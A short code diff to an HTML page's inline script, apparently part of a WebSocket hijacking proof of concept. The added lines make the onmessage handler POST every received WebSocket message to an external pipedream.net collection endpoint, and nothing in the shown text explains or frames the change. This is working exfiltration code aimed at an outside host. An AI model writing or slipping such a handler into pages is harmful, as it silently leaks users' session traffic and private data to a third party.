@@ -16,7 +16,14 @@
         ws.send("hello");
       };
       ws.onmessage = function (event) {
-        console.log(event);
+        console.log(event.data)
+        fetch("https://eotp0j2o6hthpx9.m.pipedream.net",
+          {
+              method: "POST",
+              body: event.data
+          })
+          .then(function(res){ return res.json(); })
+          .then(function(data){ console.log(data) })
       };
     }, 1000)
   </script>
